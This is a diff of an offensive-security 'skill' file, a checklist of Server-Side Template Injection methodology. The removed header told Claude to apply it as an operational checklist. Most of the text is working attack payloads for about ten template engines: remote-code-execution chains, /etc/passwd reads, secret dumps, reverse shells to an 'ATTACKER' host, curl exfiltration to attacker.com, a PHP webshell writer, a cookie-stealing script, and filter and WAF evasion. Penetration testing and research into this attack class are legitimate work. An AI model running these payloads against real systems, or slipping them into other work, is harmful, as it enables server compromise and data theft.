@@ -1,347 +1,758 @@
-# SKILL: Server-Side Template Injection (SSTI)
-
-## Metadata
-- **Skill Name**: ssti
-- **Folder**: offensive-ssti
-- **Source**: https://github.com/SnailSploit/offensive-checklist/blob/main/ssti.md
-
-## Description
-Server-Side Template Injection testing checklist: template engine identification (Jinja2, Twig, Freemarker, Pebble, Velocity), polyglot detection payloads, engine-specific RCE payloads, blind SSTI, and filter bypass. Use when testing web apps for template injection vulnerabilities.
-
-## Trigger Phrases
-Use this skill when the conversation involves any of:
-`SSTI, server-side template injection, Jinja2, Twig, Freemarker, Pebble, Velocity, template injection, template RCE, polyglot payload, template engine, blind SSTI`
-
-## Instructions for Claude
-
-When this skill is active:
-1. Load and apply the full methodology below as your operational checklist
-2. Follow steps in order unless the user specifies otherwise
-3. For each technique, consider applicability to the current target/context
-4. Track which checklist items have been completed
-5. Suggest next steps based on findings
-
 ---
-
-## Full Methodology
+name: offensive-ssti
+description: "Server-Side Template Injection methodology covering detection through exploitation across all major template engines. Includes polyglot detection strings and engine fingerprinting decision trees, engine-specific exploitation for Jinja2 (MRO sandbox escape), Twig (_self.env gadgets), Freemarker (Execute class), Velocity (Runtime.exec), Pebble (java.lang.Runtime), Smarty (literal tag abuse), Mako (module.os), Handlebars (prototype pollution to RCE), ERB (system/exec), and Thymeleaf (SpEL expression injection). Covers blind SSTI via time-based delays, OOB DNS exfiltration, and error inference. Addresses filter bypass through encoding, string concatenation, attribute access alternatives, and WAF evasion. Maps exploitation in modern frameworks including Flask, Django, Spring Boot, Express, and Rails. Details chaining paths from SSTI to SSRF, file read, and full RCE, plus automated exploitation with tplmap and SSTImap."
+---
 
 # Server-Side Template Injection (SSTI)
 
-Template engines are software used to generate dynamic web pages. When user input is unsafely embedded into templates, server-side template injection (SSTI) can occur, potentially leading to Remote Code Execution (RCE).
+Server-side template injection occurs when user input is concatenated into a template
+string and processed by the template engine as code rather than data. The engine
+evaluates the injected expression, giving you access to the server-side runtime. In
+most engines this leads directly to remote code execution because template languages
+expose access to the underlying language's object model. You find SSTI wherever
+developers pass user input to functions like `render_template_string()`,
+`Template.compile()`, or `new Template()` instead of passing it as a template variable.
 
-## Shortcut
+## Quick Workflow
 
-- Look for all locations where user input is reflected or used in the response (URL parameters, POST data, HTTP headers, JSON data, etc.).
-- Inject template syntax characters/polyglots like `${{<%[%'"}}%\`, `{{7*'7'}}`, `{{7*7}}` into inputs. Check for errors, mathematical evaluation (e.g., `49` instead of `7*7`), or missing/changed reflections.
-- Verify server-side evaluation (e.g., math works) vs. client-side XSS.
-- Use engine-specific syntax (e.g., `${7/0}`, `{{7/0}}`, `<%= 7/0 %>`), known variable names (`{{config}}`, `{$smarty}`), or error messages to identify the template engine (use a decision tree like PortSwigger's or HackTricks').
-- Look up payloads specific to the identified engine and backend language.
-- Use engine-specific payloads (see Methodologies) to read files, execute commands, access internal data, or escape sandboxes.
-- Create a non-destructive proof of concept (e.g., `touch ssti_poc_by_YOUR_NAME.txt` via RCE).
+1. Identify all reflection points: URL parameters, POST bodies, headers, JSON values, path segments.
+2. Inject polyglot detection strings and observe responses for evaluation, errors, or blank output.
+3. Fingerprint the template engine using engine-specific syntax and error signatures.
+4. Confirm server-side execution (not client-side rendering or XSS).
+5. Select engine-specific payloads for information disclosure, file read, or RCE.
+6. Bypass filters and WAF rules using encoding, concatenation, or alternative attribute access.
+7. For blind contexts, use time-based, OOB DNS, or error-based inference techniques.
+8. Chain SSTI to SSRF, file read, or full RCE depending on the engine and sandbox.
 
-## Mechanisms
+---
 
-Server-Side Template Injection (SSTI) occurs when attacker-controlled input is embedded unsafely into a server-side template. Instead of treating the input as data, the template engine executes it as part of the template's code. This allows injecting template directives to execute arbitrary code, access server data, or perform actions as the application.
+## Detection and Engine Fingerprinting
 
-**Root Cause:** Concatenating or directly rendering user input within a template string without proper sanitization or using insecure template functions.
+### Polyglot Detection Strings
 
-- Misusing “helper” APIs that compile raw strings at runtime, such as `render_template_string`, `Template::render_inline`, or `Template.compile`, which appear safe but execute attacker‑supplied data.
+Inject these strings into every reflection point. Each one triggers evaluation in
+different engine families, so a single response that shows mathematical evaluation,
+an error traceback, or blank output where the string should appear indicates SSTI.
 
-### Vulnerable Example 1 (Simple Jinja2)
+```text
+# Universal polyglots - inject these first
+${{<%[%'"}}%\
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+{{7*'7'}}
+#{7*7}
+*{7*7}
+@(7+7)
 
-The following program takes user input and concatenates it directly into a template string:
+# Engine-narrowing probes
+{{config}}                    # Jinja2/Flask - dumps app config
+{{self}}                      # Jinja2 - returns TemplateReference
+${T(java.lang.Math).PI}      # Thymeleaf/SpEL - returns 3.14159...
+${class.getSimpleName()}      # Velocity - returns class name
+{$smarty.version}             # Smarty - returns version string
+{{_self.env}}                 # Twig - returns Environment object
+<#assign x=1>${x}            # Freemarker - returns 1
+${self.module.__name__}       # Mako - returns module name
+```
+
+### Engine Fingerprinting Decision Tree
+
+Use a systematic approach to identify the engine. Start with `{{7*7}}` and branch
+based on the response:
+
+```text
+Inject {{7*7}}
+  |
+  +-- Returns "49" --> Jinja2, Twig, Nunjucks, or Handlebars
+  |     |
+  |     +-- Inject {{7*'7'}}
+  |           +-- Returns "7777777" --> Jinja2 or Nunjucks
+  |           |     +-- Inject {{config}} --> returns config? --> Jinja2 (Flask)
+  |           |     +-- Inject {{range(10)}} --> works? --> Nunjucks
+  |           +-- Returns "49" --> Twig
+  |           +-- Error --> Handlebars (limited expression support)
+  |
+  +-- No output or error --> Try ${7*7}
+  |     +-- Returns "49" --> Freemarker, Velocity, Mako, or Thymeleaf
+  |     |     +-- Inject ${class} --> returns object? --> Velocity
+  |     |     +-- Inject ${T(java.lang.Math).PI} --> returns pi? --> Thymeleaf (SpEL)
+  |     |     +-- Inject <#assign x=1>${x} --> returns 1? --> Freemarker
+  |     |     +-- Error contains "mako" --> Mako
+  |     +-- No output --> Try <%= 7*7 %>
+  |           +-- Returns "49" --> ERB (Ruby) or EJS (Node)
+  |           +-- Error with "erb" or "Erubi" --> ERB
+  |           +-- Error with "ejs" --> EJS
+  |
+  +-- Reflected literally --> Try @(7+7)
+        +-- Returns "14" --> Razor (.NET)
+        +-- No evaluation --> Likely not vulnerable (or requires different syntax)
+```
+
+### Error-Based Identification
+
+Deliberately trigger errors to extract engine and version information from stack traces:
+
+```text
+# Trigger division by zero or type errors
+{{7/0}}              # Jinja2: ZeroDivisionError traceback
+${7/0}               # Freemarker: ArithmeticException
+<%= 7/0 %>           # ERB: ZeroDivisionError
+{{foobar}}           # Twig: Variable "foobar" does not exist
+${foobar}            # Velocity: prints literally (no error, useful signal)
+{{__xxxxxxx__}}      # Jinja2: UndefinedError with engine name in traceback
+```
+
+### Blind SSTI Detection
+
+When output is not reflected (email templates, PDF generation, background jobs), use
+out-of-band and time-based techniques.
+
+```text
+# Time-based (Jinja2) - cause a measurable delay
+{{range(99999999)|join}}
+
+# Time-based (Freemarker) - Thread.sleep
+${T(java.lang.Thread).sleep(5000)}
+
+# OOB DNS exfiltration (Jinja2)
+{{''.__class__.__mro__[1].__subclasses__()[XXX]('nslookup burpcollaborator.net',shell=True,stdout=-1).communicate()}}
+
+# OOB HTTP (Twig with curl)
+{{'/usr/bin/curl http://attacker.com/'|filter('system')}}
+
+# Error inference - inject invalid syntax and check for behavioral differences
+# If {{7*7}} and {{7*'INVALID are handled differently (error page vs. normal page),
+# the engine is processing the input even without visible output
+```
+
+---
+
+## Engine-Specific Exploitation
+
+### Jinja2 (Python) - MRO Sandbox Escape
+
+Jinja2's sandboxed mode restricts attribute access, but you bypass it by walking the
+Method Resolution Order (MRO) to reach `object.__subclasses__()` and from there to
+dangerous classes like `subprocess.Popen` or `os._wrap_close`.
 
 ```python
-# Assume user_input comes from an HTTP request parameter
-from jinja2 import Template
-tmpl = Template("<html><h1>The user's name is: " + user_input + "</h1></html>")
-print(tmpl.render())
+# Step 1: Reach the object base class via MRO
+{{ ''.__class__.__mro__[1] }}
+# Returns: <class 'object'>
+
+# Step 2: List all subclasses
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+
+# Step 3: Find subprocess.Popen (index varies by Python version)
+# Enumerate at runtime - never hardcode the index
+{% for cls in ''.__class__.__mro__[1].__subclasses__() %}
+  {% if 'Popen' in cls.__name__ %}
+    {{ loop.index0 }}: {{ cls }}
+  {% endif %}
+{% endfor %}
+
+# Step 4: RCE via subprocess.Popen
+{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()[0] }}
+
+# Alternative: reach os module through __globals__
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+
+# Alternative: through cycler (works in strict sandboxes)
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+
+# Alternative: through config object (Flask)
+{{ config.__class__.from_envvar.__globals__.__builtins__.__import__('os').popen('id').read() }}
+
+# File read without RCE
+{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
 ```
 
-If `user_input` is `{{1+1}}`, the engine executes the expression:
+### Twig (PHP) - _self.env and Filter Abuse
 
-```html
-<html>
-  <h1>The user's name is: 2</h1>
-</html>
+Twig 1.x exposed `_self.env` which gave access to the Environment object and its
+methods. Twig 2.x+ removed direct access, but filter-based exploitation remains
+viable when unsafe extensions are loaded.
+
+```php
+# Twig 1.x - _self.env access (deprecated but still found in legacy apps)
+{{_self.env.registerUndefinedFilterCallback("exec")}}
+{{_self.env.getFilter("id")}}
+
+# Twig 2.x/3.x - filter-based execution (requires 'system' or similar in allowed filters)
+{{'id'|filter('system')}}
+{{'cat /etc/passwd'|filter('exec')}}
+
+# Twig - information disclosure
+{{app.request.server.all|join(',')}}
+{{app.request.cookies.all|join(',')}}
+{{'/'|file_excerpt(1,30)}}
+
+# Twig - reading files via the source function (if available)
+{{'/etc/passwd'|file_excerpt(1,100)}}
+
+# Twig 3.x - map filter for RCE
+{{'id'|filter('passthru')}}
+{{['id']|map('system')|join}}
+{{['cat /etc/passwd']|map('passthru')}}
+
+# Twig - using sort filter with a callback
+{{['id',0]|sort('system')|join}}
 ```
 
-### Vulnerable Example 2 (Flask/Jinja2)
+### Freemarker (Java) - Execute Class
+
+Freemarker provides the `freemarker.template.utility.Execute` class which directly
+executes system commands when instantiated via the `?new()` built-in.
+
+```java
+// Direct RCE via Execute class
+<#assign cmd = "freemarker.template.utility.Execute"?new()>
+${cmd("id")}
+${cmd("cat /etc/passwd")}
+
+// Alternative one-liner
+${"freemarker.template.utility.Execute"?new()("id")}
+
+// ObjectConstructor for arbitrary class instantiation
+<#assign classloader=object?new("java.lang.ProcessBuilder", ["id"])>
+${classloader.start()}
+
+// File read via TemplateModel
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
+
+// Environment variable disclosure
+${.data_model}
+${.globals}
+```
+
+### Velocity (Java) - Runtime.exec
+
+Velocity templates access Java objects directly. Use the `$class` variable or
+reflection to reach `java.lang.Runtime`.
+
+```java
+// Classic RCE via Runtime.exec
+#set($runtime = $class.inspect("java.lang.Runtime").type.getRuntime())
+#set($process = $runtime.exec("id"))
+#set($reader = $class.inspect("java.io.BufferedReader").type)
+#set($isr = $class.inspect("java.io.InputStreamReader").type)
+#set($input = $reader.getDeclaredConstructor($isr).newInstance($process.getInputStream()))
+#foreach($i in [1..100])
+  #set($line = $input.readLine())
+  #if($line) $line #end
+#end
+
+// Shorter alternative
+#set($x=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
+$x.waitFor()
+#set($s=$class.inspect("java.util.Scanner").type)
+#set($sc=$s.getDeclaredConstructor($x.getInputStream().getClass()).newInstance($x.getInputStream()))
+$sc.useDelimiter("\\A").next()
+```
+
+### Pebble (Java) - java.lang.Runtime
+
+Pebble is a Java template engine inspired by Twig. It exposes Java objects through
+template expressions.
+
+```java
+// RCE via beans and Runtime
+{% set cmd = 'id' %}
+{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
+{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(bytes, 0, bytes.length) }}
+
+// Alternative via ProcessBuilder
+{% set pb = (1).TYPE.forName('java.lang.ProcessBuilder') %}
+{% set process = pb.getDeclaredConstructors()[0].newInstance([['id']]) %}
+{{ process.start().inputStream.readAllBytes() }}
+```
+
+### Smarty (PHP) - literal Tag and Static Methods
+
+Smarty allows PHP code execution through several vectors depending on version and
+configuration.
+
+```php
+// Smarty 3.x - {php} tags (if enabled, disabled by default in 3.1+)
+{php}echo shell_exec('id');{/php}
+
+// Smarty - static method calls
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['cmd']); ?>",self::clearConfig())}
+
+// Smarty - {literal} tag abuse for JavaScript injection leading to SSJI
+{literal}<script>document.location='http://attacker.com/?c='+document.cookie</script>{/literal}
+
+// Smarty - math function abuse
+{math equation="(\"\\x73\\x79\\x73\\x74\\x65\\x6d\")(\"id\")"}
+
+// Smarty - information disclosure
+{$smarty.version}
+{$smarty.template}
+{$smarty.config}
+```
+
+### Mako (Python) - Module-Level Imports
+
+Mako templates have direct access to Python's module system through the `self.module`
+namespace, making RCE straightforward.
 
 ```python
-from flask import Flask, request, render_template_string
+# Direct os module access
+${self.module.cache.util.os.popen('id').read()}
 
-app = Flask(__name__)
+# Alternative via __import__
+<% import os %>${os.popen('id').read()}
 
-@app.route('/')
-def home():
-    # Vulnerable: Directly renders user input from 'user' query parameter
-    if request.args.get('user'):
-        return render_template_string('Welcome ' + request.args.get('user'))
-    else:
-        return render_template_string('Hello World!')
+# Using the module namespace
+${self.module.os.popen('id').read()}
 
-# Attacker URL: http://<server>/?user={{7*7}}
-# Response: Welcome 49
+# File read
+<% f = open('/etc/passwd').read() %>${f}
+
+# Reverse shell
+<% import socket,subprocess,os; s=socket.socket(); s.connect(("ATTACKER",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"]) %>
 ```
 
-### Secure Example (Flask/Jinja2)
+### ERB (Ruby) - system and exec
+
+ERB (Embedded Ruby) templates execute Ruby code directly within `<%= %>` tags.
+
+```ruby
+# Command execution
+<%= system("id") %>
+<%= `id` %>
+<%= exec("id") %>
+<%= IO.popen("id").read() %>
+
+# File read
+<%= File.open('/etc/passwd').read() %>
+<%= Dir.entries('/') %>
+
+# Reverse shell
+<%= require 'socket'; TCPSocket.open('ATTACKER',4444).to_i; exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f) %>
+
+# Environment variables
+<%= ENV.to_a.map{|k,v| "#{k}=#{v}"}.join("\n") %>
+```
+
+### Thymeleaf (Java/Spring) - SpEL Expression Injection
+
+Thymeleaf in Spring Boot applications evaluates Spring Expression Language (SpEL).
+When user input reaches a Thymeleaf template path or expression, you get code execution
+through SpEL.
+
+```java
+// SpEL RCE via T() operator (type reference)
+${T(java.lang.Runtime).getRuntime().exec('id')}
+
+// SpEL with output capture
+${T(org.apache.commons.io.IOUtils).toString(
+  T(java.lang.Runtime).getRuntime().exec('id').getInputStream()
+)}
+
+// URL-based injection in Spring Boot (path variable interpreted as template)
+// GET /path;/__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
+
+// Thymeleaf preprocessor expressions
+__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
+
+// File read via SpEL
+${T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/etc/passwd'))}
+
+// Environment disclosure
+${@environment.getProperty('spring.datasource.password')}
+```
+
+### Handlebars (Node.js) - Prototype Pollution to RCE
+
+Handlebars is logic-less by design, but prototype pollution or unsafe helpers create
+RCE paths.
+
+```javascript
+// Prototype pollution to RCE (requires a prototype pollution gadget)
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').execSync('id')"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+
+// Via unsafe custom helpers (if registered)
+{{execute "id"}}
+
+// Information disclosure
+{{this}}
+{{@root}}
+```
+
+---
+
+## Filter Bypass and WAF Evasion
+
+### Character Restriction Bypass (Jinja2)
+
+When characters like `.`, `_`, `[`, or `'` are filtered, use alternative access methods.
 
 ```python
-from flask import Flask, request, render_template_string
+# Dot (.) blocked - use attr() filter or bracket notation
+{{ request|attr('application') }}
+{{ request['application'] }}
 
-app = Flask(__name__)
+# Underscore (_) blocked - use hex encoding
+{{ ''|attr('\x5f\x5fclass\x5f\x5f') }}
+# Or pass via request parameter: ?a=__class__
+{{ ''|attr(request.args.a) }}
 
-@app.route('/')
-def home():
-    # Secure: Passes user input as a variable to the template
-    if request.args.get('user'):
-        # The template engine treats 'username' as data, not code
-        return render_template_string('Welcome {{ username }}', username=request.args.get('user'))
-    else:
-        # ...
+# Quotes blocked - use request parameters to inject strings
+# URL: ?cmd=id&module=os
+{{ self.__init__.__globals__.__builtins__.__import__(request.args.module).popen(request.args.cmd).read() }}
+
+# Brackets blocked - use attr() chains
+{{ request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')() }}
+
+# Multiple restrictions - combine techniques
+# Pass components via URL parameters and assemble at runtime
+# URL: ?c=__class__&m=__mro__&s=__subclasses__
+{{ ()|attr(request.args.c)|attr(request.args.m)|last|attr(request.args.s)() }}
 ```
 
-## Hunt
+### String Concatenation Evasion
 
-### Preparation
+```python
+# Jinja2 - concatenate blocked keywords
+{{ ''['__cla'+'ss__'] }}
+{{ ''|attr('__cla'~'ss__') }}              # Tilde is Jinja2 concat operator
+{{ ''|attr(['__cla','ss__']|join) }}
 
-- Identify all user-controlled input points: URL parameters, POST data, HTTP headers (Referer, User-Agent, custom headers), JSON keys/values, etc.
-- Use tools like `waybackurls` and `qsreplace` to generate fuzzing lists for parameters:
-  ```bash
-  waybackurls http://target.com | qsreplace "ssti{{9*9}}" > fuzz.txt
-  ffuf -u FUZZ -w fuzz.txt -replay-proxy http://127.0.0.1:8080/ -mr "ssti81"
-  # Check Burp Repeater/Logger++ for responses containing the evaluated result (e.g., 81)
-  ```
+# Jinja2 - build strings from chr() via request
+{% set chr = ''.__class__.__mro__[1].__subclasses__()[80].__init__.__globals__.__builtins__.chr %}
+{{ ''[chr(95)+chr(95)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(95)+chr(95)] }}
 
-### Detection
-
-- Initial Fuzzing: Inject basic polyglots: `${{<%[%'"}}%\`, `{{7*'7'}}`, `{{7*7}}`, `${7*7}`, **quote‑less payloads** such as `{{[].__class__.__mro__[1]}}`.
-- Observe Behavior:
-  - Errors: Stack traces or specific error messages can reveal the template engine (e.g., Jinja2, Smarty, FreeMarker).
-  - Evaluation: Input like `{{7*7}}` becomes `49`.
-  - Blank Output: The payload might be processed and removed if invalid or if it performs an action without output.
-  - No Change: Input reflected exactly as provided; likely not vulnerable (or requires different syntax).
-- Differentiate from XSS: Ensure the evaluation happens server-side, not client-side. `${7*7}` evaluating to `49` strongly suggests SSTI.
-
-### Identification
-
-#### Engine-Specific Payloads
-
-Use a systematic approach based on the initial observations or a decision tree ([PortSwigger, updated July 2024](https://portswigger.net/research/server-side-template-injection), [Medium](https://miro.medium.com/v2/resize:fit:1100/format:webp/1%2A35XwCGeYeKYmeaU8rdkSdg.jpeg)).
-
-#### Additional Common Engines (2024‑2025)
-
-| Engine                           | Fingerprint                                         | Simple RCE / Info payload                                         |
-| -------------------------------- | --------------------------------------------------- | ----------------------------------------------------------------- |
-| **Mako** (Python/Pyramid)        | Error message containing `mako.exceptions`          | `${self.module.os.popen('id').read()}`                            |
-| **Blade** (Laravel 11)           | `Undefined variable` or `@dd($loop)` dumps          | `{!!\\Illuminate\\Support\\Facades\\Artisan::call('about')!!}`    |
-| **Groovy / GSP**                 | Stack trace with `groovy.text.SimpleTemplateEngine` | `<% Class.forName('java.lang.Runtime').runtime.exec('id') %>`     |
-| **Tera / Askama (Rust)**         | Files ending `.tera` / `.askama.rs`                 | No generic RCE yet; watch for logic injection                     |
-| **EJS / Pug (Node)**             | `.ejs`, `.pug` templates                            | Often needs gadget via helpers/filters; prototype chains          |
-| **Twig (PHP)**                   | Error mentions `Twig\\`                             | `{% for k,v in _self %}` info, RCE via unsafe extensions          |
-| **Liquid** (Shopify/Ruby)        | `{{product.title}}`, errors mention `Liquid::`      | Limited by default; see Liquid-specific payloads below            |
-| **Nunjucks** (Node/Mozilla)      | Mozilla's Jinja2 port, `.njk` templates             | Prototype chain to `Function` or `require`                        |
-| **Handlebars** (Node)            | `{{this}}`, `{{@root}}` work                        | Limited RCE; requires unsafe helpers or prototype pollution       |
-| **Thymeleaf 3.1+** (Java/Spring) | `th:text="${...}"`, Spring Boot stack traces        | `${T(java.lang.Runtime).getRuntime().exec('id')}` if SpEL enabled |
-
-#### Variable Probing
-
-Try injecting known variables for common frameworks: `{{config}}`, `{{settings}}`, `{{app.request.server.all|join(',')}}`, `{$smarty.version}`.
-
-## Bypass Techniques
-
-### Character Blacklist Bypass
-
-- Use alternative syntax: `getattr(object, 'attribute')` instead of `object.attribute`. Use `{{request|attr('application')}}` instead of `{{request.application}}`.
-- Use array/dictionary access: `request['application']` instead of `request.application`.
-- Hex/Octal Encoding (if interpreted server-side): `request['\x5f\x5fglobals\x5f\x5f']` instead of `request['__globals__']`.
-  ```python
-  # Example: Bypass '.' and '_' using brackets and hex
-  {{ request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']() }}
-  # Example: Using attr() and hex (Source: HackTricks)
-  {%raw %}{% with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()%}{{a}}{% endwith %}{% endraw %}
-  ```
-- URL Parameter manipulation (Source: HackTricks):
-  - Pass attribute name: `?c=__class__` -> `{{ request|attr(request.args.c) }}`
-  - Construct attribute name: `?f=%s%sclass%s%s&a=_` -> `{{ request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a)) }}`
-  - List join: `?l=a&a=_&a=_&a=class&a=_&a=_` -> `{{ request|attr(request.args.getlist(request.args.l)|join) }}`
-
-> **Note:** The index for `subprocess.Popen` differs between CPython 3.11 and 3.12; enumerate `__subclasses__()` at runtime instead of hard‑coding.
-
-### Keyword Filtering Bypass
-
-- Concatenation: `'os'.__class__` -> `'o'+'s'`
-- Using `request` object attributes or environment variables if keywords like `import` or `os` are blocked.
-- Jinja2 Context Variables: Access `os` via `{{ self._TemplateReference__context.cycler.__init__.__globals__.os }}` or similar paths ([Source: Podalirius](https://podalirius.net/fr/articles/python-vulnerabilities-code-execution-in-jinja-templates/)).
-
-### NET Reflection
-
-Use reflection to load assemblies or invoke methods indirectly.
-On modern ASP.NET Core, Razor limits direct process start; look for misused `Html.Raw`, custom tag helpers, or debug compilation flags.
-
-### String-less Exploitation
-
-Modern WAFs often filter quotes and common keyword tokens. 2025 research showed how to build strings from arithmetic or list indices.
-
-```jinja
-{{ (().__class__.__base__.__subclasses__()[104].__init__.__globals__).os.popen('id').read() }}
+# Twig - concatenate
+{{ ('sys'~'tem')('id') }}
 ```
 
-For Node templating (EJS/Pug/Handlebars server-side), prefer prototype traversal to reach `Function` or `require` when helpers expose evaluation sinks:
+### Encoding-Based Bypass
 
-```js
-<%=(global.constructor.constructor('return process.mainModule.require("child_process").execSync("id").toString()')())%>
+```python
+# Hex encoding for attribute names (Jinja2)
+{{ request['\x5f\x5fclass\x5f\x5f'] }}
+{{ request|attr('\x5f\x5fclass\x5f\x5f') }}
+
+# Unicode encoding
+{{ request|attr('__class__') }}
+
+# Octal encoding
+{{ request|attr('\137\137class\137\137') }}
+
+# Base64 in Mako
+<% import base64; exec(base64.b64decode('aW1wb3J0IG9zOyBwcmludChvcy5wb3BlbignaWQnKS5yZWFkKCkp')) %>
+
+# URL encoding for WAF bypass (double-encode if WAF decodes once)
+%7B%7B7*7%7D%7D
+%257B%257B7*7%257D%257D   # double-encoded
 ```
 
-### Recent CVEs (2024‑2025)
+### WAF-Specific Bypass Techniques
 
-| CVE            | Affected component                          | Severity | Fixed in              |
-| -------------- | ------------------------------------------- | -------- | --------------------- |
-| CVE‑2024‑22195 | Jinja2 sandbox / `xmlattr` filter bypass    | High     | 3.1.3                 |
-| CVE‑2024‑46507 | Yeti threat‑intel platform SSTI → RCE       | Critical | 1.6.2                 |
-| Various (2024) | Atlassian Confluence widgets, CrushFTP, HFS | Critical | See vendor advisories |
+```text
+# Technique: Break tokens across parameters
+# Some WAFs scan individual parameters but not their combination
+?a={{&b=7*7&c=}}
 
-### Automated Scanning & CI Integration
+# Technique: Use HTTP parameter pollution
+?name={{7*7}}&name=safe_value    # Some backends take the first, WAF checks the last
 
-- **nuclei** and **semgrep** include up‑to‑date SSTI rules; integrate them into pull‑request checks.
-- GitHub code‑scanning query pack “SSTI” (released 2024‑10) covers Python, PHP, Go.
-- Add a CI gate blocking merges on raw `render_template_string` or `.format()` inside templates.
+# Technique: Content-Type confusion
+# Submit as application/json or multipart/form-data if the WAF only inspects
+# application/x-www-form-urlencoded
 
-## Vulnerabilities
+# Technique: Case variation (engine-dependent)
+# Some engines are case-insensitive for built-in names
+{{Config}}    # May work if WAF blocks lowercase {{config}}
 
-Common vulnerable patterns include:
+# Technique: Whitespace and comment injection
+{{ 7 * 7 }}           # Extra spaces
+{%- if 1 -%}49{%- endif -%}    # Jinja2 whitespace control
+{{7 *- 7}}            # Unusual operator spacing
+```
 
-- Direct Rendering: `render_template_string("Hello " + user_input)`
-- Unsafe Variable Usage: `{{ unsafe_variable }}` where `unsafe_variable` contains template code.
-- Framework-Specific Functions: Using functions known to be dangerous if processing user input (consult framework documentation).
+---
 
-## Methodologies
+## Modern Framework Exploitation
 
-### Tools
+### Flask / Jinja2 (Python)
 
-**Active Exploitation:**
+```python
+# Flask debug mode - check for Werkzeug debugger console
+# GET /__debugger__?__debugger__=yes&cmd=__import__('os').popen('id').read()&frm=0&s=SECRET
 
-- **tplmap**: `python tplmap.py -u 'http://www.target.com/page?name=John*'` ([https://github.com/epinna/tplmap](https://github.com/epinna/tplmap))
-- **SSTImap**: `python3 sstimap.py -u "https://example.com/page?name=John" -s`
-- **TInjA**: `tinja url -u "http://example.com/?name=Kirlia"`
-- **crithit** – SSTI‑centric fuzzer supporting Go/Tera, Blade, and Mako (2024)
+# Flask config secrets
+{{ config.SECRET_KEY }}
+{{ config['SQLALCHEMY_DATABASE_URI'] }}
 
-**Burp Suite Extensions:**
+# Django templates (limited by design - no arbitrary code execution)
+# But information disclosure is possible
+{{ settings.SECRET_KEY }}     # If debug=True
+{% debug %}                    # Dumps context variables
+{{ request.META }}             # Server environment
+```
 
-- **Template Injector** – maintained fork replacing TemplateTester
-- **Server Side Template Injection** - Active scanner checks
-- **Param Miner** - Discover hidden parameters that might accept template input
+### Spring Boot / Thymeleaf (Java)
 
-**Scanning & Detection:**
+```java
+// Path-based SSTI in Spring Boot (CVE-2020-27386 pattern)
+// Controller returns user input as view name
+// GET /path/__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
 
-- **nuclei** (`templates/ssti-*`) – fast HTTP scanner with updated SSTI signatures (2024-2025)
-- **semgrep** with SSTI rulesets – Static analysis for template injection vulnerabilities
-- **GitHub CodeQL** "SSTI" query pack (2024-10) – Covers Python, PHP, Go
+// SpEL injection via @Value or th:text
+// If user input reaches a SpEL expression context:
+${T(java.lang.Runtime).getRuntime().exec(
+  new String[]{'bash','-c','curl http://attacker.com/$(whoami)'}
+)}
 
-**Framework-Specific:**
+// Accessing Spring beans
+${@beanName.methodName()}
+${@environment.getProperty('spring.datasource.url')}
 
-- **Jinja2 Sandbox Escape Tools** - Testing Jinja2 sandboxed environments
-- **Node Template Tester** - EJS/Pug/Handlebars/Nunjucks testing suite
+// Bypassing SpEL restrictions
+${T(Character).toString(105).concat(T(Character).toString(100))}   # builds "id"
+```
 
-### Manual Testing & Exploitation Payloads
+### Express / EJS / Pug (Node.js)
 
-- Generic/Polyglot:
-  - `${{<%[%'"}}%\.`
-  - `{{7*7}}` -> `49`
-  - `{{7*'7'}}` -> `7777777`
-  - `{{ '7'*7 }}` (Jinja2) -> `7777777`
-  - `@(1+2)` (.NET Razor) -> `3`
-- Jinja2 (Python / Flask):
-  - Debug/Info: `{{config}}`, `{{self}}`, `{{settings.SECRET_KEY}}`, `{% debug %}` (Requires debug extension)
-  - List Subclasses: `{{ [].__class__.__base__.__subclasses__() }}` , `{{ ''.__class__.__mro__[1].__subclasses__() }}` (Index 1 or 2 depending on Python version)
-  - Recover `object` Class: `{{ ''.__class__.__mro__[1] }}` (or `[2]`), `{{ ''.__class__.__base__ }}`
-  - Find File Class: Iterate through subclasses list or guess index, e.g., `[40]` on some systems.
-  - Read File (via `__subclasses__`): `{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}` (Index varies)
